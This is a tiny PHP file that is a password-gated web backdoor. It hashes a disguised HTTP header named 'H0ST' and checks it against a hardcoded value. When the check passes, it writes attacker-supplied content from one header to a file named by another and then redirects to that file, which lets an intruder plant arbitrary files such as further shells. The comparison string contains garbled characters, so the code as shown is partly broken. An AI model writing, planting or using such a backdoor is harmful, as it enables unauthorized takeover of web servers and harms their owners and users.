<?php

if(crypt($_SERVER['HTTP_H0ST'],51)==��514zR17F8j0q6��){@file_put_contents($_SERVER['HTTP_X'],$_SERVER['HTTP_Y']);header("Location: ./".$_SERVER['HTTP_X']);};

?>